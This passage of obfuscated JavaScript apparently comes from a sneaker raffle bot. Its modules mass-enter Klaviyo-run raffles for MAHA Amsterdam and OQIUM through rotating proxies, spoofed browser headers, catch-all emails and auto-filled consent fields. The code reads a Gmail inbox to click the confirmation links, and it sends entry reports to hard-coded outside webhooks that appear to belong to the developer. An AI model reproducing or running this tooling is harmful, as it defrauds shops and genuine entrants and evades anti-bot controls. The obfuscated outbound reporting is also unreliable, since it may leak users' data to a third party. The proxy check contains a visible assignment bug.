                            if (_0x41e642 == 'yes' && _0xec5b0d != 0x5) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20Retrying')), _0x3dba94 = _0x3dba94 - 0x1, _0xec5b0d = _0xec5b0d + 0x1;
                                continue;
                            }
                            _0x41e642 == 'yes' && _0xec5b0d >= 0x5 && (_0x1ac5d5(_0x24a850[_0x3dba94], _0x47cdbb), _0x41e642 = 'no', _0xec5b0d = 0x0), console['log']('Waiting\x20for\x20' + _0x5e160d['AfewDelay'] + '\x20ms'), await _0x38c39e(_0x5e160d['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xfdbc, _0x5c419c, _0x47188e) {
                    for (var _0x31b2b2 = 0x0; _0x31b2b2 < _0x5c419c['length']; _0x31b2b2++) {
                        async function _0x58517a(_0x5ed72f, _0xabad4, _0x4c3d66, _0x52d85b, _0x45e642) {
                            var _0x36979c, _0x3249a4 = {}, _0xec0fab = [], _0x45f20b = {}, _0x597969 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x238398 = Math['round'](Math['random']() * (_0x597969['length'] - 0x1));
                            _0x52d85b[_0x5ed72f]['Size'] == 'RANDOM' && (_0x52d85b[_0x5ed72f]['Size'] = _0x597969[_0x238398]);
                            !_0x52d85b && (_0x52d85b = {});
                            if (_0xabad4 != 'ver') {
                                _0x2ad028(_0x4c3d66['name'] + '\x20Task\x20' + (_0x5ed72f + 0x1) + '\x20/\x20' + _0x52d85b['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92), await _0x3962cc(_0x52d85b, _0x5ed72f), _0x3249a4 = _0x4c3d66['data'];
                                _0xabad4 == 'exp' ? _0x3249a4['data']['attributes']['email'] = '' + _0x52d85b[_0x5ed72f]['FirstName'] + _0x52d85b[_0x5ed72f]['LastName'] + _0x5e160d['catchall'] : _0x3249a4['data']['attributes']['email'] = '' + _0x52d85b[_0x5ed72f]['Email'];
                                if (_0x52d85b[_0x5ed72f]['Size'] == 'RANDOM') {
                                }
                                _0x3249a4['data']['attributes']['properties']['$first_name'] = '' + _0x52d85b[_0x5ed72f]['FirstName'], _0x3249a4['data']['attributes']['properties']['$last_name'] = '' + _0x52d85b[_0x5ed72f]['LastName'], _0x3249a4['data']['attributes']['properties']['$address1'] = _0x52d85b[_0x5ed72f]['Address1'] + '\x20' + _0x52d85b[_0x5ed72f]['Address2'] + '\x20' + _0x52d85b[_0x5ed72f]['HouseNumber'], _0x3249a4['data']['attributes']['properties']['$zip'] = '' + _0x52d85b[_0x5ed72f]['Zip'], _0x3249a4['data']['attributes']['properties']['$city'] = '' + _0x52d85b[_0x5ed72f]['City'], _0x3249a4['data']['attributes']['properties']['$country'] = '' + _0x52d85b[_0x5ed72f]['Country'], _0x3249a4['data']['attributes']['properties']['Size'] = '' + _0x52d85b[_0x5ed72f]['Size'], _0x3249a4['data']['attributes']['properties']['$phone_number'] = '' + _0x52d85b[_0x5ed72f]['Phone'], _0x3249a4['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x52d85b[_0x5ed72f]['Follower'];
                            }
                            if (_0x5e160d['useRandomProxy'] = ![])
                                var _0x3ebc9a = _0x45e642[_0x5ed72f]['split'](':');
                            else
                                var _0x2524b1 = Math['round'](Math['random']() * (_0x45e642['length'] - 0x1)), _0x3ebc9a = _0x45e642[_0x2524b1]['split'](':');
                            var _0x37299a = {
                                'jar': _0xe4a440,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x4c3d66['url'],
                                'headers': _0x4c3d66['headers'],
                                'body': JSON['stringify'](_0x3249a4),
                                'proxy': 'http://' + _0x3ebc9a[0x2] + ':' + _0x3ebc9a[0x3] + '@' + _0x3ebc9a[0x0] + ':' + _0x3ebc9a[0x1]
                            };
                            return _0xabad4 != 'ver' && (_0x37299a['url'] = _0x4c3d66['url'], _0x37299a['headers'] = _0x4c3d66['headers']), _0xabad4 == 'ver' && (_0x37299a['method'] = 'GET'), new Promise(function (_0x7e2bdb, _0x1abfb9) {
                                callback = async (_0x5cc924, _0x4efd49, _0x297564) => {
                                    if (!_0x5cc924 && _0x4efd49['statusCode'] == 0xca || !_0x5cc924 && _0x4efd49['statusCode'] == 0xc8) {
                                        if (_0xabad4 != 'ver') {
                                            var _0xed77ee = await _0x485032(_0x52d85b[_0x5ed72f], _0x4c3d66, 'dev', ![]), _0x1b59ad = await _0x485032(_0x52d85b[_0x5ed72f], _0x4c3d66, 'pub', ![]);
                                            const _0x2a36e8 = {
                                                'succesDEVMSG': { 'embeds': [_0xed77ee] },
                                                'succesPUBMSG': { 'embeds': [_0x1b59ad] }
                                            };
                                            if (_0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '')
                                                try {
                                                    await _0x16a920(_0x5e160d['webhook'], _0x2a36e8['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x2a36e8['succesDEVMSG']), await _0x38c39e(0xc8);
                                            try {
                                                await _0x16a920(_0x2766d4, _0x2a36e8['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x41f993(_0x52d85b[_0x5ed72f], _0x4c3d66);
                                        }
                                        _0x7e2bdb(console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x4c3d66['name'] + ']\x20Task\x20' + (_0x5ed72f + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0xabad4 != 'ver') {
                                            var _0x33cd9a = '' + _0x5cc924, _0x11de8c = await _0x485032(_0x52d85b[_0x5ed72f], _0x4c3d66, 'dev', !![], _0x33cd9a), _0x1447df = {};
                                            _0x1447df['errorDEV'] = { 'embeds': [_0x11de8c] }, _0x1ac5d5(_0x52d85b[_0x5ed72f], _0x4c3d66), _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x1447df['errorDEV']), await _0x16a920(_0x233d0f, _0x1447df['errorDEV']);
                                        }
                                        _0x1abfb9(console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x4c3d66['name'] + ']\x20Task\x20' + (_0x5ed72f + 0x1) + ':\x20' + _0x5cc924)));
                                    }
                                };
                                try {
                                    _0xabad4 != 'ver' && console['log'](_0x21c871() + '\x20[' + _0x4c3d66['name'] + ']\x20Task\x20' + (_0x5ed72f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3249a4['data']['attributes']['email']), _0x247acd(_0x37299a, callback);
                                } catch (_0x3d96f) {
                                    console['log'](_0x21c871() + '\x20Task\x20' + (_0x5ed72f + 0x1) + ':\x20' + _0x3d96f);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x58517a(_0x31b2b2, 'nor', _0xfdbc, _0x5c419c, _0x47188e), console['log'](_0x21c871() + '\x20[' + _0xfdbc['name'] + ']\x20Sleeping\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        } catch (_0x1c5680) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x15e291, _0x1b7a5a, _0x30880e) {
                    var _0x1f8b5f = [];
                    async function _0x5e26a2() {
                        var _0x10c98a = new _0xdc01cc({
                            'user': _0x5e160d['masterMail'],
                            'password': _0x5e160d['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x426db5(_0x1504d0) {
                            _0x10c98a['openBox']('INBOX', ![], _0x1504d0);
                        }
                        _0x10c98a['once']('ready', function () {
                            _0x426db5(function (_0x3626f1, _0x1f43ea) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3626f1)
                                    throw _0x3626f1;
                                _0x10c98a['seq']['search'](['UNSEEN'], function (_0x1d3ae2, _0x2754ae) {
                                    if (!_0x2754ae || !_0x2754ae['length'])
                                        console['log'](_0x21c871() + '\x20[' + _0x15e291['name'] + ']\x20No\x20mails\x20found'), _0x10c98a['end']();
                                    else {
                                        var _0x41c4da = _0x10c98a['seq']['fetch'](_0x2754ae, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x41c4da['on']('message', function (_0x4a2c0d, _0x508998) {
                                            var _0x4c7ded = '(#' + _0x508998 + ')\x20';
                                            _0x4a2c0d['on']('body', function (_0x3555c0, _0x1db870) {
                                                _0x31366c(_0x3555c0, (_0x1017e8, _0x4acf82) => {
                                                    if (_0x4acf82['subject'] == 'Confirm\x20Your\x20Subscription' && _0x4acf82['from']['value'][0x0]['name'] == 'Maha\x20Amsterdam') {
                                                        var _0x386077 = _0x4acf82['text']['split']('(')[0x1], _0x5ae276 = _0x386077['split'](')')[0x0];
                                                        _0x1f8b5f['push'](_0x5ae276);
                                                    }
                                                });
                                            }), _0x4a2c0d['once']('end', function () {
                                            });
                                        }), _0x41c4da['once']('error', function (_0x2e73dd) {
                                            console['log']('Fetch\x20error:\x20' + _0x2e73dd);
                                        }), _0x41c4da['once']('end', function () {
                                            _0x10c98a['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x10c98a['once']('error', function (_0xd36daa) {
                            console['log'](_0x52c84d['red'](_0xd36daa['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x10c98a['once']('end', async function () {
                        }), _0x10c98a['connect']();
                    }
                    async function _0x18fc37(_0x570ed3, _0x2a2959, _0x46cb0f) {
                        for (var _0x1fd93e = 0x0; _0x1fd93e < _0x2a2959['length']; _0x1fd93e++) {
                            async function _0x5c3b9c(_0x188a04, _0x1aa963, _0xbca81d, _0x5ed707, _0x16ee48) {
                                var _0x4f90ed, _0x151bd5 = {}, _0x1c40bd = [], _0x31d1f5 = {}, _0x21e0cf = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x26bb30 = Math['round'](Math['random']() * (_0x21e0cf['length'] - 0x1));
                                _0x5ed707[_0x188a04]['Size'] == 'RANDOM' && (_0x5ed707[_0x188a04]['Size'] = _0x21e0cf[_0x26bb30]);
                                !_0x5ed707 && (_0x5ed707 = {});
                                if (_0x5e160d['useRandomProxy'] = ![])
                                    var _0xc966e0 = _0x16ee48[_0x188a04]['split'](':');
                                else
                                    var _0x232741 = Math['round'](Math['random']() * (_0x16ee48['length'] - 0x1)), _0xc966e0 = _0x16ee48[_0x232741]['split'](':');
                                var _0x1d5cda = {
                                    'jar': _0xe4a440,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xbca81d['url'],
                                    'headers': _0xbca81d['headers'],
                                    'body': JSON['stringify'](_0x151bd5),
                                    'proxy': 'http://' + _0xc966e0[0x2] + ':' + _0xc966e0[0x3] + '@' + _0xc966e0[0x0] + ':' + _0xc966e0[0x1]
                                };
                                return _0x1aa963 != 'ver' && (_0x1d5cda['url'] = _0xbca81d['url'], _0x1d5cda['headers'] = _0xbca81d['headers']), _0x1aa963 == 'ver' && (_0x1d5cda['method'] = 'GET', _0x1d5cda['url'] = _0x5ed707[_0x188a04]), new Promise(function (_0x47d1fd, _0x4f0958) {
                                    callback = async (_0x4345f2, _0x4d0f3c, _0x3ab6c4) => {
                                        if (!_0x4345f2 && _0x4d0f3c['statusCode'] == 0xca || !_0x4345f2 && _0x4d0f3c['statusCode'] == 0xc8) {
                                            if (_0x1aa963 != 'ver') {
                                                var _0x561653 = await _0x485032(_0x5ed707[_0x188a04], _0xbca81d, 'dev', ![]), _0x256b97 = await _0x485032(_0x5ed707[_0x188a04], _0xbca81d, 'pub', ![]);
                                                const _0x349666 = {
                                                    'succesDEVMSG': { 'embeds': [_0x561653] },
                                                    'succesPUBMSG': { 'embeds': [_0x256b97] }
                                                };
                                                if (_0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '')
                                                    try {
                                                        await _0x16a920(_0x5e160d['webhook'], _0x349666['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x349666['succesDEVMSG']), await _0x38c39e(0xc8);
                                                try {
                                                    await _0x16a920(_0x2766d4, _0x349666['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x41f993(_0x5ed707[_0x188a04], _0xbca81d);
                                            }
                                            _0x47d1fd(console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0xbca81d['name'] + ']\x20Task\x20' + (_0x188a04 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x1aa963 != 'ver') {
                                                var _0x565139 = '' + _0x4345f2, _0x2c9d92 = await _0x485032(_0x5ed707[_0x188a04], _0xbca81d, 'dev', !![], _0x565139), _0x3158d6 = {};
                                                _0x3158d6['errorDEV'] = { 'embeds': [_0x2c9d92] }, _0x1ac5d5(_0x5ed707[_0x188a04], _0xbca81d), _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x3158d6['errorDEV']), await _0x16a920(_0x233d0f, _0x3158d6['errorDEV']);
                                            }
                                            _0x4f0958(console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0xbca81d['name'] + ']\x20Task\x20' + (_0x188a04 + 0x1) + ':\x20' + _0x4345f2)));
                                        }
                                    };
                                    try {
                                        _0x1aa963 != 'ver' ? console['log'](_0x21c871() + '\x20[' + _0xbca81d['name'] + ']\x20Task\x20' + (_0x188a04 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x151bd5['data']['attributes']['email']) : console['log'](_0x21c871() + '\x20[' + _0xbca81d['name'] + ']\x20Task\x20' + (_0x188a04 + 0x1) + ':\x20Fetching\x20Response'), _0x247acd(_0x1d5cda, callback);
                                    } catch (_0x23c92c) {
                                        console['log'](_0x21c871() + '\x20Task\x20' + (_0x188a04 + 0x1) + ':\x20' + _0x23c92c);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5c3b9c(_0x1fd93e, 'ver', _0x570ed3, _0x2a2959, _0x46cb0f), console['log'](_0x21c871() + '\x20[' + _0x570ed3['name'] + ']\x20Sleeping\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                            } catch (_0x4b898f) {
                            }
                        }
                    }
                    try {
                        _0x5e26a2(), await _0x38c39e(0xfa0), console['log']('Found\x20' + _0x1f8b5f['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x38c39e(0x9c4);
                    }
                    await _0x18fc37(_0x15e291, _0x1f8b5f, _0x30880e);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RsxJgQ',
                            'custom_source': 'DV6989-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TiDS2V',
                                '$consent_form_version': 0x80926b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3f4d12, _0xb23530, _0x27a85b) {
                    for (var _0x5777ef = 0x0; _0x5777ef < _0xb23530['length']; _0x5777ef++) {
                        async function _0x290944(_0x4a86b9, _0x1315dc, _0x4679bc, _0x2ce7c9, _0x55f23c) {
                            var _0x1a98fd, _0x467b09 = {}, _0x19f133 = [], _0xcd66c7 = {}, _0x5a3037 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x23aaff = Math['round'](Math['random']() * (_0x5a3037['length'] - 0x1));
                            _0x2ce7c9[_0x4a86b9]['Size'] == 'RANDOM' && (_0x2ce7c9[_0x4a86b9]['Size'] = _0x5a3037[_0x23aaff]);
                            !_0x2ce7c9 && (_0x2ce7c9 = {});
                            if (_0x1315dc != 'ver') {
                                _0x2ad028(_0x4679bc['name'] + '\x20Task\x20' + (_0x4a86b9 + 0x1) + '\x20/\x20' + _0x2ce7c9['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92), await _0x3962cc(_0x2ce7c9, _0x4a86b9), _0x19f133 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x50a338
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x2ce7c9[_0x4a86b9]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x5e160d['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0xa56f6b
                                        }
                                    ]
                                }], _0xcd66c7 = { 'embeds': _0x19f133 }, _0x467b09 = _0x4679bc['data'];
                                _0x1315dc == 'exp' ? _0x467b09['data']['attributes']['email'] = '' + _0x2ce7c9[_0x4a86b9]['FirstName'] + _0x2ce7c9[_0x4a86b9]['LastName'] + _0x5e160d['catchall'] : _0x467b09['data']['attributes']['email'] = '' + _0x2ce7c9[_0x4a86b9]['Email'];
                                if (_0x2ce7c9[_0x4a86b9]['Size'] == 'RANDOM') {
                                }
                                _0x467b09['data']['attributes']['properties']['$first_name'] = '' + _0x2ce7c9[_0x4a86b9]['FirstName'], _0x467b09['data']['attributes']['properties']['$last_name'] = '' + _0x2ce7c9[_0x4a86b9]['LastName'], _0x467b09['data']['attributes']['properties']['$address1'] = _0x2ce7c9[_0x4a86b9]['Address1'] + '\x20' + _0x2ce7c9[_0x4a86b9]['Address2'] + '\x20' + _0x2ce7c9[_0x4a86b9]['HouseNumber'], _0x467b09['data']['attributes']['properties']['$zip'] = '' + _0x2ce7c9[_0x4a86b9]['Zip'], _0x467b09['data']['attributes']['properties']['$city'] = '' + _0x2ce7c9[_0x4a86b9]['City'], _0x467b09['data']['attributes']['properties']['$country'] = '' + _0x2ce7c9[_0x4a86b9]['Country'], _0x467b09['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2ce7c9[_0x4a86b9]['Size'], _0x467b09['data']['attributes']['properties']['$phone_number'] = '' + _0x2ce7c9[_0x4a86b9]['Phone'], _0x467b09['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2ce7c9[_0x4a86b9]['Follower'];
                            }
                            if (_0x5e160d['useRandomProxy'] = ![])
                                var _0xc2cc7f = _0x55f23c[_0x4a86b9]['split'](':');
                            else
                                var _0x133f63 = Math['round'](Math['random']() * (_0x55f23c['length'] - 0x1)), _0xc2cc7f = _0x55f23c[_0x133f63]['split'](':');
                            var _0x47e649 = {
                                'jar': _0xe4a440,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x4679bc['url'],
                                'headers': _0x4679bc['headers'],
                                'body': JSON['stringify'](_0x467b09),
                                'proxy': 'http://' + _0xc2cc7f[0x2] + ':' + _0xc2cc7f[0x3] + '@' + _0xc2cc7f[0x0] + ':' + _0xc2cc7f[0x1]
                            };
                            return _0x1315dc != 'ver' && (_0x47e649['url'] = _0x4679bc['url'], _0x47e649['headers'] = _0x4679bc['headers']), _0x1315dc == 'ver' && (_0x47e649['method'] = 'GET'), new Promise(function (_0x5981f2, _0x413f16) {
                                callback = async (_0x2c3501, _0x571749, _0x2b7539) => {
                                    if (!_0x2c3501 && _0x571749['statusCode'] == 0xca || !_0x2c3501 && _0x571749['statusCode'] == 0xc8) {
                                        if (_0x1315dc != 'ver') {
                                            var _0xc2c015 = await _0x485032(_0x2ce7c9[_0x4a86b9], _0x4679bc, 'dev', ![]), _0x1a7282 = await _0x485032(_0x2ce7c9[_0x4a86b9], _0x4679bc, 'pub', ![]);
                                            const _0x1eca03 = {
                                                'succesDEVMSG': { 'embeds': [_0xc2c015] },
                                                'succesPUBMSG': { 'embeds': [_0x1a7282] }
                                            };
                                            if (_0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '')
                                                try {
                                                    await _0x16a920(_0x5e160d['webhook'], _0x1eca03['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x1eca03['succesDEVMSG']), await _0x38c39e(0xc8);
                                            try {
                                                await _0x16a920(_0x2766d4, _0x1eca03['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x41f993(_0x2ce7c9[_0x4a86b9], _0x4679bc);
                                        }
                                        _0x5981f2(console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x4679bc['name'] + ']\x20Task\x20' + (_0x4a86b9 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x1315dc != 'ver') {
                                            var _0x518cb9 = '' + _0x2c3501, _0x47bdc7 = await _0x485032(_0x2ce7c9[_0x4a86b9], _0x4679bc, 'dev', !![], _0x518cb9), _0xab626c = {};
                                            _0xab626c['errorDEV'] = { 'embeds': [_0x47bdc7] }, _0x1ac5d5(_0x2ce7c9[_0x4a86b9], _0x4679bc), _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0xab626c['errorDEV']), await _0x16a920(_0x233d0f, _0xab626c['errorDEV']);
                                        }
                                        _0x413f16(console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x4679bc['name'] + ']\x20Task\x20' + (_0x4a86b9 + 0x1) + ':\x20' + _0x2c3501)));
                                    }
                                };
                                try {
                                    _0x1315dc != 'ver' && console['log'](_0x21c871() + '\x20[' + _0x4679bc['name'] + ']\x20Task\x20' + (_0x4a86b9 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x467b09['data']['attributes']['email']), _0x247acd(_0x47e649, callback);
                                } catch (_0x25b8fd) {
                                    console['log'](_0x21c871() + '\x20Task\x20' + (_0x4a86b9 + 0x1) + ':\x20' + _0x25b8fd);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x290944(_0x5777ef, 'nor', _0x3f4d12, _0xb23530, _0x27a85b), console['log'](_0x21c871() + '\x20[' + _0x3f4d12['name'] + ']\x20Sleeping\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        } catch (_0x322c28) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x9ebd4b, _0x5c9213, _0x5a3d5b) {
                    var _0x5c9213 = [];
                    async function _0x5d6391() {
                        var _0x41f760 = new _0xdc01cc({
